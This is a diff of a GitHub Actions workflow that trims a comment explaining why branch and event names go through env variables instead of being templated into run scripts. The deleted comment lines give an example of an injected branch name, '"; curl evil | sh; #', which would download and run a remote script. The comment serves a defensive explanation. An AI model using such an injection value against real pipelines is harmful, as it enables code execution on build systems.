@@ -203,9 +203,8 @@ jobs:
     steps:
       - name: Compute deploy metadata
         id: meta
-        # Through `env:`, not `${{ }}` inside `run:`. GitHub expands a template into the
-        # script *text* before any shell sees it, so a branch named `"; curl evil | sh; #`
-        # would be executed rather than compared. As an env var it stays data.
+        # Through env, not ${{ }} in run: a template is expanded into the script text,
+        # so a hostile branch name would be executed rather than compared.
         env:
           EVENT_NAME: ${{ github.event_name }}
           REF_NAME: ${{ github.ref_name }}
